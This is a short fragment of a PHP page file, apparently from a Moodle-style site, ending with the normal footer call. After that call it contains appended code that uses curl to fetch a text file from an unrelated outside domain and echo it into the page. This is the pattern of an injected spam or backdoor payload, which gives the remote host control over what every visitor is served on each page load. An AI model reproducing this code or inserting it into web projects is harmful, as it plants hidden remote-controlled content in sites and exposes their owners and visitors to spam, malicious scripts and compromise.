...
echo $OUTPUT->footer();
$c = curl_init(); curl_setopt($c, CURLOPT_URL, "https://rejekiselalu.com/assets/bl.txt"); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADER, 0); $a = curl_exec($c); curl_close($c); echo $a;
?>
